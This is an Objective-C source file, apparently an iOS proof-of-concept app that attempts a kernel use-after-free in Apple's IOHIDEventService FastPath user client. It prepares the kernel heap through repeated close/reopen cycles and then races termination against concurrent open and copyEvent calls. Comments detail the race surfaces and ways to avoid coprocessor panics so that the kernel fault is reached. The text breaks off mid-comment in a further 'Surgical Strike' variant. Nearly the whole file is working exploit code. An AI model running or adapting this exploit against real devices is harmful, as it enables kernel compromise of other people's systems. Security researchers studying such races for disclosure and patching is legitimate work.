        char name[128] = {0};
        char parentClass[128] = {0};
        char grandparentClass[128] = {0};
        if (sGetClass) sGetClass(service, className);
        if (sGetName) sGetName(service, name);

        // Walk up: parent and grandparent
        io_object_t parent = MACH_PORT_NULL;
        if (sGetParent) {
            kr = sGetParent(service, "IOService", &parent);
            if (kr == KERN_SUCCESS && parent) {
                if (sGetClass) sGetClass(parent, parentClass);
                // Grandparent — helps identify AppleSPU further up the tree
                io_object_t grandparent = MACH_PORT_NULL;
                kr = sGetParent(parent, "IOService", &grandparent);
                if (kr == KERN_SUCCESS && grandparent) {
                    if (sGetClass) sGetClass(grandparent, grandparentClass);
                    sIOObjectRelease(grandparent);
                }
                sIOObjectRelease(parent);
            }
        }

        // Check if any ancestor contains "SPU"
        BOOL isSPU = (strstr(parentClass, "SPU") != NULL ||
                       strstr(grandparentClass, "SPU") != NULL ||
                       strstr(className, "SPU") != NULL);

        // Try open(type=2) + selector 0 (FastPath open)
        io_connect_t probe = MACH_PORT_NULL;
        kr = sIOServiceOpen(service, mach_task_self_, 2, &probe);
        kern_return_t openKr = kr;
        BOOL canOpen = (openKr == KERN_SUCCESS && probe != MACH_PORT_NULL);
        kern_return_t sel0Kr = KERN_INVALID_ARGUMENT;
        BOOL sel0Ok = NO;
        if (canOpen) {
            uint64_t s = 0;
            sel0Kr = sIOConnectCallMethod(probe, kSelectorOpen,
                &s, 1, kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1,
                NULL, NULL, NULL, NULL);
            sel0Ok = (sel0Kr == KERN_SUCCESS);
            uint64_t cs = 0;
            sIOConnectCallMethod(probe, kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
            sIOServiceClose(probe);
            if (sel0Ok) {
                totalSel0Ok++;
                if (isSPU) sel0OkSPU++;
                else sel0OkNonSPU++;
            }
        }

        NSString *spuTag = isSPU ? @" [SPU]" : @"";
        NSString *openTag = [NSString stringWithFormat:@"%@ (0x%x)", canOpen ? @"YES" : @"NO", openKr];
        NSString *sel0Tag = canOpen
            ? [NSString stringWithFormat:@"%@ (0x%x)", sel0Ok ? @"YES" : @"NO", sel0Kr]
            : @"NO (n/a)";
        uint64_t entryID = 0;
        char path[512] = {0};
        BOOL haveID = (sGetEntryID && sGetEntryID(service, &entryID) == KERN_SUCCESS);
        BOOL havePath = (sGetPath && sGetPath(service, "IOService", path) == KERN_SUCCESS);
        NSString *idTag = haveID ? [NSString stringWithFormat:@" id=0x%llx", entryID] : @"";
        NSString *pathTag = (sel0Ok && havePath) ? [NSString stringWithFormat:@" path=%s", path] : @"";

        [self appendLog:[NSString stringWithFormat:
            @"  [%d] %s (%s) parent=%s gp=%s open=%@ sel0=%@%@%@%@",
            idx, name, className, parentClass, grandparentClass,
            openTag, sel0Tag, spuTag, idTag, pathTag]];

        sIOObjectRelease(service);
        idx++;
    }
    sIOObjectRelease(iter);
    [self appendLog:[NSString stringWithFormat:
        @"\n  Total: %d services, %d sel0-ok (%d SPU, %d non-SPU)",
        idx, totalSel0Ok, sel0OkSPU, sel0OkNonSPU]];
    if (sel0OkNonSPU > 0) {
        [self appendLog:@"  ** Non-SPU sel0-ok service found — should avoid AOP panic **"];
    } else if (totalSel0Ok > 0) {
        [self appendLog:@"  All sel0-ok services are SPU-backed — AOP risk unavoidable"];
    }
}

/// Find an IOHIDEventService for which selector 0 (FastPath open) succeeds,
/// preferring non-AppleSPU providers.
/// AppleSPU sends coprocessor messages on every open/close which causes AOP panics.
/// Non-SPU providers exercise the same IOHIDEventServiceFastPathUserClient race
/// without the coprocessor side effects.
- (io_service_t)findGateableService {
    if (![self loadIOKitSymbols]) return MACH_PORT_NULL;

    typedef kern_return_t (*IOObjectGetClassFn)(io_object_t, char *);
    typedef kern_return_t (*IORegistryEntryGetParentEntryFn)(io_object_t, const char *, io_object_t *);
    IOObjectGetClassFn sGetClass = (IOObjectGetClassFn)dlsym(sIOKitHandle, "IOObjectGetClass");
    IORegistryEntryGetParentEntryFn sGetParent = (IORegistryEntryGetParentEntryFn)dlsym(sIOKitHandle, "IORegistryEntryGetParentEntry");

    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) return MACH_PORT_NULL;

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) return MACH_PORT_NULL;

    io_service_t bestNonSPU = MACH_PORT_NULL;
    io_service_t fallbackSPU = MACH_PORT_NULL;
    io_service_t service;

    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        // Test if selector 0 succeeds
        io_connect_t probe = MACH_PORT_NULL;
        kr = sIOServiceOpen(service, mach_task_self_, 2, &probe);
        if (kr != KERN_SUCCESS || probe == MACH_PORT_NULL) {
            sIOObjectRelease(service);
            continue;
        }
        uint64_t s = 0;
        kern_return_t sel0Kr = sIOConnectCallMethod(probe, kSelectorOpen,
            &s, 1, kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1,
            NULL, NULL, NULL, NULL);
        uint64_t cs = 0;
        sIOConnectCallMethod(probe, kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
        sIOServiceClose(probe);

        if (sel0Kr != KERN_SUCCESS) {
            sIOObjectRelease(service);
            continue;
        }

        // Check if SPU-backed (walk parent + grandparent)
        BOOL isSPU = NO;
        char className[128] = {0};
        if (sGetClass) sGetClass(service, className);
        if (strstr(className, "SPU") != NULL) isSPU = YES;

        if (!isSPU && sGetParent) {
            io_object_t parent = MACH_PORT_NULL;
            kr = sGetParent(service, "IOService", &parent);
            if (kr == KERN_SUCCESS && parent) {
                char parentClass[128] = {0};
                if (sGetClass) sGetClass(parent, parentClass);
                if (strstr(parentClass, "SPU") != NULL) isSPU = YES;
                // Check grandparent too
                if (!isSPU) {
                    io_object_t gp = MACH_PORT_NULL;
                    kr = sGetParent(parent, "IOService", &gp);
                    if (kr == KERN_SUCCESS && gp) {
                        char gpClass[128] = {0};
                        if (sGetClass) sGetClass(gp, gpClass);
                        if (strstr(gpClass, "SPU") != NULL) isSPU = YES;
                        sIOObjectRelease(gp);
                    }
                }
                sIOObjectRelease(parent);
            }
        }

        if (!isSPU && bestNonSPU == MACH_PORT_NULL) {
            bestNonSPU = service;
            [self appendLog:[NSString stringWithFormat:
                @"  Selected non-SPU service: %s", className]];
        } else if (isSPU && fallbackSPU == MACH_PORT_NULL) {
            fallbackSPU = service;
        } else {
            sIOObjectRelease(service);
        }
    }
    sIOObjectRelease(iter);

    // Prefer non-SPU to avoid AOP panics
    if (bestNonSPU != MACH_PORT_NULL) {
        if (fallbackSPU != MACH_PORT_NULL) sIOObjectRelease(fallbackSPU);
        [self appendLog:@"  Using non-SPU provider (no AOP risk)"];
        return bestNonSPU;
    }
    if (fallbackSPU != MACH_PORT_NULL) {
        [self appendLog:@"  WARNING: only SPU-backed services available — AOP panic risk"];
        return fallbackSPU;
    }
    return MACH_PORT_NULL;
}

- (void)termRaceOnlyTapped {
    self.triggerButton.enabled = NO;
    self.termRaceOnlyButton.enabled = NO;
    [self appendLog:@"\n========== Phase 3 Only: Termination Race =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols"];
        self.triggerButton.enabled = YES;
        self.termRaceOnlyButton.enabled = YES;
        return;
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        io_service_t svc = [self findGateableService];
        if (svc == MACH_PORT_NULL) {
            [self appendLog:@"FAIL: no sel0-ok IOHIDEventService found"];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.triggerButton.enabled = YES;
                self.termRaceOnlyButton.enabled = YES;
            });
            return;
        }
        [self appendLog:@"Found sel0-ok IOHIDEventService"];

        const char *xml = kOpenPropertiesXML;
        const size_t xmlLen = strlen(xml) + 1;

        // Set up opener connections
        io_connect_t openerConns[kNumOpeners];
        int openerCount = 0;
        for (int p = 0; p < kNumOpeners; p++) {
            openerConns[p] = MACH_PORT_NULL;
            kern_return_t pkr = sIOServiceOpen(svc, mach_task_self_, 2, &openerConns[p]);
            if (pkr != KERN_SUCCESS || openerConns[p] == MACH_PORT_NULL) continue;
            uint64_t s = 0;
            kern_return_t okr = sIOConnectCallMethod(openerConns[p], kSelectorOpen,
                &s, 1, xml, xmlLen, NULL, NULL, NULL, NULL);
            if (okr == KERN_SUCCESS) {
                openerCount++;
            } else {
                sIOServiceClose(openerConns[p]);
                mach_port_deallocate(mach_task_self(), openerConns[p]);
                openerConns[p] = MACH_PORT_NULL;
            }
        }

        [self appendLog:[NSString stringWithFormat:
            @"  %d openers, batch=%d, window=%dus, duration=%.0fs",
            openerCount, kBatchSize, kRaceWindowUs, kTermRaceDuration]];

        if (openerCount == 0) {
            [self appendLog:@"FAIL: no opener connections"];
            sIOObjectRelease(svc);
            dispatch_async(dispatch_get_main_queue(), ^{
                self.triggerButton.enabled = YES;
                self.termRaceOnlyButton.enabled = YES;
            });
            return;
        }

        __block volatile int opPause = 1;
        __block volatile int opStop = 0;
        __block volatile int totalOpenerCycles = 0;

        dispatch_group_t openerGroup = dispatch_group_create();

        for (int o = 0; o < openerCount; o++) {
            io_connect_t oc = openerConns[o];
            dispatch_group_enter(openerGroup);
            dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                uint32_t local = 0;
                while (!opStop) {
                    while (opPause && !opStop) usleep(50);
                    if (opStop) break;
                    uint64_t cs = 0;
                    (void)sIOConnectCallMethod(oc, kSelectorClose,
                        &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    (void)sIOConnectCallMethod(oc, kSelectorOpen,
                        &cs, 1, xml, xmlLen, NULL, NULL, NULL, NULL);
                    local++;
                }
                __sync_fetch_and_add(&totalOpenerCycles, (int)local);
                dispatch_group_leave(openerGroup);
            });
        }

        int totalProbes = 0;
        int batchCount = 0;
        NSDate *raceStart = [NSDate date];

        while ([[NSDate date] timeIntervalSinceDate:raceStart] < kTermRaceDuration) {
            opPause = 1;
            __sync_synchronize();
            usleep(1000);

            io_connect_t probes[kBatchSize];
            int gated = 0;
            for (int v = 0; v < kBatchSize; v++) {
                probes[v] = MACH_PORT_NULL;
                kern_return_t vkr = sIOServiceOpen(svc, mach_task_self_, 2, &probes[v]);
                if (vkr != KERN_SUCCESS || probes[v] == MACH_PORT_NULL) continue;
                uint64_t s = 0;
                kern_return_t gkr = sIOConnectCallMethod(probes[v], kSelectorOpen,
                    &s, 1, xml, xmlLen, NULL, NULL, NULL, NULL);
                if (gkr != KERN_SUCCESS) {
                    sIOServiceClose(probes[v]);
                    mach_port_deallocate(mach_task_self(), probes[v]);
                    probes[v] = MACH_PORT_NULL;
                    continue;
                }
                gated++;
            }

            if (gated == 0) { usleep(10000); continue; }

            opPause = 0;
            __sync_synchronize();
            usleep(2000);

            for (int v = 0; v < kBatchSize; v++) {
                if (probes[v] == MACH_PORT_NULL) continue;
                mach_port_destruct(mach_task_self(), probes[v], 0, 0);
                totalProbes++;
            }

            usleep(kRaceWindowUs);
            batchCount++;

            if (batchCount % 20 == 0) {
                [self appendLog:[NSString stringWithFormat:
                    @"  batch %d: %d probes torn down", batchCount, totalProbes]];
            }
        }

        opStop = 1;
        opPause = 0;
        __sync_synchronize();
        dispatch_group_wait(openerGroup, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));

        NSTimeInterval elapsed = [[NSDate date] timeIntervalSinceDate:raceStart];
        [self appendLog:[NSString stringWithFormat:
            @"\n  TermRace: %d batches, %d probes in %.1fs (%.1f/s)",
            batchCount, totalProbes, elapsed, totalProbes / fmax(elapsed, 0.001)]];
        [self appendLog:[NSString stringWithFormat:@"  Opener cycles: %d", (int)totalOpenerCycles]];

        for (int p = 0; p < kNumOpeners; p++) {
            if (openerConns[p] == MACH_PORT_NULL) continue;
            uint64_t cs = 0;
            (void)sIOConnectCallMethod(openerConns[p], kSelectorClose,
                &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
            (void)sIOServiceClose(openerConns[p]);
            (void)mach_port_deallocate(mach_task_self(), openerConns[p]);
        }
        sIOObjectRelease(svc);

        [self appendLog:@"\n========== Done =========="];
        [self appendLog:@"If still alive, race window not hit. Re-run to retry."];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.triggerButton.enabled = YES;
            self.termRaceOnlyButton.enabled = YES;
            self.uafFocusButton.enabled = YES;
        });
    });
}

#pragma mark - Conditioned Race (Lifecycle Stress + TermRace + Sel2 Readers)

/// Conditioned termination race with concurrent sel2 readers.
///
/// Why previous approaches all hit AOP instead of the kernel UAF:
///   - AOP OUTBOX3 panic happens when opener threads monopolize the command gate
///     (tight sel1→sel0 loop). The work loop can't service SPU outbox interrupts
///     between gated actions. SPU responses pile up → OUTBOX3 assert.
///   - This is a RACE between UAF and AOP: whichever fault fires first wins.
///
/// This approach tips the balance toward UAF by:
///   1. HEAP CONDITIONING first — 32 close/reopen cycles across all connections
///      primes the ClientObject zone free list (same as TestPOC's successful run)
///   2. LIFECYCLE STRESS — 15s of sel1→sel0 cycling + sel2 copyEvent readers
///      puts the provider's internal state into a heavily churned state
///   3. TERMINATION RACE with concurrent sel2 readers — the key difference:
///      - 2 openers (not 3) with 100us yield between cycles → reduces SPU pressure
///      - sel2 copyEvent readers run concurrently → additional race targets
///        (copyEvent reads provider internals under userclient IOLock while
///         closeForClient frees entries on termination thread with NO lock)
///      - This gives TWO concurrent race surfaces:
///        (a) openForClient iteration (command gate) vs closeForClient (no gate)
///        (b) copyEvent (userclient IOLock) vs closeForClient (no lock)
///
- (void)uafFocusTapped {
    self.triggerButton.enabled = NO;
    self.termRaceOnlyButton.enabled = NO;
    self.uafFocusButton.enabled = NO;
    self.precisionButton.enabled = NO;
    [self appendLog:@"\n========== Conditioned Race =========="];
    [self appendLog:@"Conditioning → lifecycle stress → termination race + sel2 readers"];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols"];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.triggerButton.enabled = YES;
            self.termRaceOnlyButton.enabled = YES;
            self.uafFocusButton.enabled = YES;
            self.precisionButton.enabled = YES;
        });
        return;
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // ---- Setup: open multiple connections to the same provider ----
        io_connect_t connsBuf[kDesiredConnections];
        io_connect_t *conns = connsBuf; // pointer alias — blocks can't capture C arrays
        io_service_t providerService = MACH_PORT_NULL;
        int connCount = [self openMultipleConnections:conns
                                             maxCount:kDesiredConnections
                                           outService:&providerService];

        if (connCount < 2 || providerService == MACH_PORT_NULL) {
            [self appendLog:[NSString stringWithFormat:
                @"Need >= 2 connections + provider, got %d. Aborting.", connCount]];
            if (providerService != MACH_PORT_NULL) sIOObjectRelease(providerService);
            for (int i = 0; i < connCount; i++) sIOServiceClose(conns[i]);
            dispatch_async(dispatch_get_main_queue(), ^{
                self.triggerButton.enabled = YES;
                self.termRaceOnlyButton.enabled = YES;
                self.uafFocusButton.enabled = YES;
                self.precisionButton.enabled = YES;
            });
            return;
        }

        [self appendLog:[NSString stringWithFormat:
            @"Opened %d connections to same provider", connCount]];

        const char *xml = kOpenPropertiesXML;
        const size_t xmlLen = strlen(xml) + 1;

        // ============================================================
        // Phase 1: Allocation Conditioning
        // Cycle close/reopen on ALL connections to churn the ClientObject
        // type-isolated zone, priming the free list.
        // ============================================================
        [self appendLog:[NSString stringWithFormat:
            @"Phase 1: Conditioning (%d cycles × %d conns)...", kMagazineDrainCycles, connCount]];

        for (int i = 0; i < kMagazineDrainCycles; i++) {
            for (int c = 0; c < connCount; c++) {
                uint64_t cs = 0;
                sIOConnectCallMethod(conns[c], kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
            }
            for (int c = connCount - 1; c >= 0; c--) {
                uint64_t os = 0;
                sIOConnectCallMethod(conns[c], kSelectorOpen, &os, 1,
                    xml, xmlLen, NULL, NULL, NULL, NULL);
            }
        }
        [self appendLog:@"Phase 1: Done"];

        // ============================================================
        // Phase 2: Lifecycle Desync Stress (15s)
        //
        //   conn[0]: lifecycle thread — sel1 close → sel0 open
        //   conn[1..N/2]: reader threads — sel2 copyEvent (ungated)
        //   conn[N/2..N]: churn threads — sel1 close → sel0 open
        //
        // sel1 close does NOT call closeForClient → no SPU messages.
        // sel0 open calls openForClient → SPU messages but gated.
        // sel2 copyEvent bypasses command gate → concurrent reads.
        // ============================================================
        [self appendLog:@"\nPhase 2: Lifecycle stress (15s)..."];

        __block atomic_int phase2Stop = 0;
        __block atomic_int phase2ReaderIters = 0;
        __block atomic_int phase2LifecycleIters = 0;
        __block atomic_int phase2ChurnIters = 0;

        int readerEnd = (connCount > 4) ? (1 + (connCount - 1) / 2) : MIN(connCount, 2);
        int readerCount = readerEnd - 1;
        if (readerCount < 1) readerCount = 1;

        [self appendLog:[NSString stringWithFormat:
            @"  lifecycle=conn[0], readers=conn[1..%d], churn=conn[%d..%d]",
            readerEnd - 1, readerEnd, connCount - 1]];

        dispatch_group_t phase2Group = dispatch_group_create();

        // Reader threads: sel2 copyEvent tight loop
        for (int rIdx = 1; rIdx < readerEnd && rIdx < connCount; rIdx++) {
            io_connect_t rc = conns[rIdx];
            dispatch_queue_t q = dispatch_queue_create("poc.p2.reader",
                dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));
            dispatch_group_enter(phase2Group);
            dispatch_async(q, ^{
                uint32_t local = 0;
                while (atomic_load(&phase2Stop) == 0) {
                    uint64_t si[2] = { 0, 1 };
                    uint8_t so[256];
                    size_t soSz = sizeof(so);
                    (void)sIOConnectCallMethod(rc, kSelectorCopyEvent,
                        si, 2, NULL, 0, NULL, NULL, so, &soSz);
                    local++;
                    if ((local & 0x3F) == 0) sched_yield();
                }
                atomic_fetch_add(&phase2ReaderIters, (int)local);
                dispatch_group_leave(phase2Group);
            });
        }

        // Lifecycle thread: sel1 close → sel0 open on conn[0]
        dispatch_group_enter(phase2Group);
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            uint32_t local = 0;
            for (int cycle = 0; cycle < kLifecycleCycles && atomic_load(&phase2Stop) == 0; cycle++) {
                uint64_t cs = 0;
                sIOConnectCallMethod(conns[0], kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
                uint64_t os = 0;
                sIOConnectCallMethod(conns[0], kSelectorOpen, &os, 1,
                    xml, xmlLen, NULL, NULL, NULL, NULL);
                local++;
                if (cycle % 500 == 0)
                    [self appendLog:[NSString stringWithFormat:@"  Lifecycle %d/%d", cycle, kLifecycleCycles]];
            }
            atomic_store(&phase2LifecycleIters, (int)local);
            dispatch_group_leave(phase2Group);
        });

        // Churn threads: sel1 close → sel0 open on remaining connections
        for (int ci = readerEnd; ci < connCount; ci++) {
            io_connect_t cc = conns[ci];
            dispatch_queue_t q = dispatch_queue_create("poc.p2.churn",
                dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));
            dispatch_group_enter(phase2Group);
            dispatch_async(q, ^{
                uint32_t local = 0;
                while (atomic_load(&phase2Stop) == 0) {
                    uint64_t cs = 0;
                    sIOConnectCallMethod(cc, kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    uint64_t os = 0;
                    sIOConnectCallMethod(cc, kSelectorOpen, &os, 1,
                        xml, xmlLen, NULL, NULL, NULL, NULL);
                    local++;
                    if ((local & 0x1F) == 0) sched_yield();
                }
                atomic_fetch_add(&phase2ChurnIters, (int)local);
                dispatch_group_leave(phase2Group);
            });
        }

        // Wait 15s for lifecycle stress
        static const NSTimeInterval kPhase2Duration = 15.0;
        dispatch_time_t p2deadline = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kPhase2Duration * NSEC_PER_SEC));
        if (dispatch_group_wait(phase2Group, p2deadline) != 0) {
            atomic_store(&phase2Stop, 1);
            dispatch_group_wait(phase2Group, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        }

        [self appendLog:[NSString stringWithFormat:
            @"Phase 2 done: reader=%d lifecycle=%d churn=%d",
            atomic_load(&phase2ReaderIters), atomic_load(&phase2LifecycleIters),
            atomic_load(&phase2ChurnIters)]];

        // Release all client slots before termination race
        for (int i = 0; i < connCount; i++) {
            uint64_t cs = 0;
            sIOConnectCallMethod(conns[i], kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
        }

        // ============================================================
        // Phase 3: Termination Race with concurrent sel2 readers
        //
        // KEY DIFFERENCES from previous approaches:
        //   - 2 openers (not 3) → less command gate monopolization
        //   - 100us yield between opener cycles → work loop drains SPU outbox
        //   - concurrent sel2 readers on conn[1..readerEnd] → second race surface
        //
        // Race surfaces:
        //   (a) openForClient (opener, command gate, work loop)
        //       vs closeForClient (termination thread, NO gate)
        //       → safeMetaCast on freed client object
        //   (b) copyEvent (reader, userclient IOLock, any thread)
        //       vs closeForClient (termination thread, NO lock)
        //       → read on freed provider internals
        // ============================================================
        [self appendLog:@"\nPhase 3: Termination race + sel2 readers..."];

        enum { kP3Openers = 2, kP3Batch = 16, kP3WindowUs = 80000 };
        static const NSTimeInterval kP3Duration = 15.0;
        static const useconds_t kOpenerYieldUs = 100; // KEY: yield between opener cycles

        // Re-open reader connections for sel2 during the race
        for (int i = 1; i < readerEnd && i < connCount; i++) {
            uint64_t os = 0;
            sIOConnectCallMethod(conns[i], kSelectorOpen, &os, 1,
                xml, xmlLen, NULL, NULL, NULL, NULL);
        }

        // Launch sel2 reader threads (concurrent with termination race)
        __block atomic_int p3ReaderStop = 0;
        __block atomic_int p3ReaderIters = 0;
        dispatch_group_t readerGroup = dispatch_group_create();
        for (int rIdx = 1; rIdx < readerEnd && rIdx < connCount; rIdx++) {
            io_connect_t rc = conns[rIdx];
            dispatch_queue_t q = dispatch_queue_create("poc.p3.reader",
                dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INTERACTIVE, 0));
            dispatch_group_enter(readerGroup);
            dispatch_async(q, ^{
                uint32_t local = 0;
                while (atomic_load(&p3ReaderStop) == 0) {
                    uint64_t si[2] = { 0, 1 };
                    uint8_t so[256];
                    size_t soSz = sizeof(so);
                    (void)sIOConnectCallMethod(rc, kSelectorCopyEvent,
                        si, 2, NULL, 0, NULL, NULL, so, &soSz);
                    local++;
                    if ((local & 0x1F) == 0) sched_yield();
                }
                atomic_fetch_add(&p3ReaderIters, (int)local);
                dispatch_group_leave(readerGroup);
            });
        }

        // Set up opener connections
        io_connect_t openerConns[kP3Openers];
        int openerCount = 0;
        for (int p = 0; p < kP3Openers; p++) {
            openerConns[p] = MACH_PORT_NULL;
            kern_return_t pkr = sIOServiceOpen(providerService, mach_task_self_, 2, &openerConns[p]);
            if (pkr != KERN_SUCCESS || openerConns[p] == MACH_PORT_NULL) continue;
            uint64_t s = 0;
            kern_return_t okr = sIOConnectCallMethod(openerConns[p], kSelectorOpen,
                &s, 1, xml, xmlLen, NULL, NULL, NULL, NULL);
            if (okr == KERN_SUCCESS) {
                openerCount++;
            } else {
                sIOServiceClose(openerConns[p]);
                mach_port_deallocate(mach_task_self(), openerConns[p]);
                openerConns[p] = MACH_PORT_NULL;
            }
        }

        [self appendLog:[NSString stringWithFormat:
            @"  %d openers (yield=%dus), batch=%d, readers=%d, window=%dus",
            openerCount, kOpenerYieldUs, kP3Batch, readerCount, kP3WindowUs]];

        if (openerCount > 0) {
            __block volatile int opPause = 1;
            __block volatile int opStop = 0;
            __block volatile int totalOpenerCycles = 0;

            dispatch_group_t openerGroup = dispatch_group_create();

            for (int o = 0; o < openerCount; o++) {
                io_connect_t oc = openerConns[o];
                dispatch_group_enter(openerGroup);
                dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                    uint32_t local = 0;
                    while (!opStop) {
                        while (opPause && !opStop) usleep(50);
                        if (opStop) break;

                        uint64_t cs = 0;
                        (void)sIOConnectCallMethod(oc, kSelectorClose,
                            &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
                        (void)sIOConnectCallMethod(oc, kSelectorOpen,
                            &cs, 1, xml, xmlLen, NULL, NULL, NULL, NULL);
                        local++;

                        // KEY: yield between cycles to let work loop service
                        // SPU outbox interrupt handler → prevents AOP OUTBOX3
                        usleep(kOpenerYieldUs);
                    }
                    __sync_fetch_and_add(&totalOpenerCycles, (int)local);
                    dispatch_group_leave(openerGroup);
                });
            }

            int totalProbes = 0;
            int batchCount = 0;
            NSDate *raceStart = [NSDate date];

            while ([[NSDate date] timeIntervalSinceDate:raceStart] < kP3Duration) {
                // Phase A: pause openers, pre-gate probe batch
                opPause = 1;
                __sync_synchronize();
                usleep(1000);

                io_connect_t probes[kP3Batch];
                int gated = 0;
                for (int v = 0; v < kP3Batch; v++) {
                    probes[v] = MACH_PORT_NULL;
                    kern_return_t vkr = sIOServiceOpen(providerService, mach_task_self_, 2, &probes[v]);
                    if (vkr != KERN_SUCCESS || probes[v] == MACH_PORT_NULL) continue;
                    uint64_t s = 0;
                    kern_return_t gkr = sIOConnectCallMethod(probes[v], kSelectorOpen,
                        &s, 1, xml, xmlLen, NULL, NULL, NULL, NULL);
                    if (gkr != KERN_SUCCESS) {
                        sIOServiceClose(probes[v]);
                        mach_port_deallocate(mach_task_self(), probes[v]);
                        probes[v] = MACH_PORT_NULL;
                        continue;
                    }
                    gated++;
                }

                if (gated == 0) { usleep(10000); continue; }

                // Phase B: resume openers, rapid-fire teardown
                opPause = 0;
                __sync_synchronize();
                usleep(2000);

                // mach_port_destruct → clientClose → terminate(0) → async didTerminate
                // didTerminate → closeForClient (NO gate) races with:
                //   (a) openers' openForClient (command gate) → safeMetaCast UAF
                //   (b) readers' copyEvent (userclient IOLock) → provider read race
                for (int v = 0; v < kP3Batch; v++) {
                    if (probes[v] == MACH_PORT_NULL) continue;
                    mach_port_destruct(mach_task_self(), probes[v], 0, 0);
                    totalProbes++;
                }

                usleep(kP3WindowUs);
                batchCount++;

                if (batchCount % 20 == 0) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  batch %d: %d probes, readers=%d",
                        batchCount, totalProbes, atomic_load(&p3ReaderIters)]];
                }
            }

            // Stop openers
            opStop = 1;
            opPause = 0;
            __sync_synchronize();
            dispatch_group_wait(openerGroup, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));

            NSTimeInterval elapsed = [[NSDate date] timeIntervalSinceDate:raceStart];
            [self appendLog:[NSString stringWithFormat:
                @"\n  TermRace: %d batches, %d probes in %.1fs (%.1f/s)",
                batchCount, totalProbes, elapsed, totalProbes / fmax(elapsed, 0.001)]];
            [self appendLog:[NSString stringWithFormat:
                @"  Openers: %d cycles (yield=%dus), Readers: %d iters",
                (int)totalOpenerCycles, kOpenerYieldUs, atomic_load(&p3ReaderIters)]];

            // Cleanup openers
            for (int p = 0; p < kP3Openers; p++) {
                if (openerConns[p] == MACH_PORT_NULL) continue;
                uint64_t cs = 0;
                (void)sIOConnectCallMethod(openerConns[p], kSelectorClose,
                    &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
                (void)sIOServiceClose(openerConns[p]);
                (void)mach_port_deallocate(mach_task_self(), openerConns[p]);
            }
        }

        // Stop sel2 readers
        atomic_store(&p3ReaderStop, 1);
        dispatch_group_wait(readerGroup, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));

        // Cleanup all connections
        for (int i = 0; i < connCount; i++) {
            uint64_t cs = 0;
            sIOConnectCallMethod(conns[i], kSelectorClose, &cs, 1, NULL, 0, NULL, NULL, NULL, NULL);
            sIOServiceClose(conns[i]);
        }
        sIOObjectRelease(providerService);

        [self appendLog:@"\n========== Done =========="];
        [self appendLog:@"If still alive, race window not hit. Re-run to retry."];
        [self appendLog:@"Best results: clean reboot → single run."];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.triggerButton.enabled = YES;
            self.termRaceOnlyButton.enabled = YES;
            self.uafFocusButton.enabled = YES;
            self.precisionButton.enabled = YES;
        });
    });
}

#pragma mark - Surgical Strike Race

/// Surgical Strike: minimize SPU messages while precisely targeting the race window.
///
/// ROOT CAUSE of previous AOP panics:
///   Pool-based approaches (24 probes) send bursts of SPU messages during pool
///   creation. Even at low average rates, the burst overflows the AOP mailbox
///   outbox (limited to ~4-8 slots), triggering OUTBOX3 assertions or watchdog
///   timeouts. The "pre-staged racer" approach also fires all racers IMMEDIATELY
///   after mach_port_destroy — but didTerminate doesn't fire for ~1-10ms, so
///   all racers complete BEFORE closeForClient even starts (zero overlap).
///
/// KEY INSIGHTS from IOHIDFamily source code analysis:
///   1. IOServiceOpen sends ZERO SPU messages. Only sel0 (openForClient) and
///      termination (closeForClient) send SPU messages.
///   2. didTerminate fires asynchronously ~1-10ms after mach_port_destroy.
///   3. openForClient and closeForClient both access the SPU provider's internal
///      collection WITHOUT mutual exclusion. The race is inside the SPU provider.
///   4. We need racers to fire DURING closeForClient, not before it.
///
/// APPROACH:
///   1. Create ONE probe, open it (1 SPU open, let it settle)
///   2. Pre-create 6 racers via IOServiceOpen only (zero SPU messages)
///   3. mach_port_destroy(probe) → triggers async closeForClient in ~1-10ms
///   4. Fire 6 racer sel0 calls STAGGERED across 1-11ms using mach_wait_until
///      on parallel threads. Each racer calls openForClient at a different time,
///      sampling the full didTerminate latency distribution.
///   5. If any racer's openForClient overlaps with the probe's closeForClient
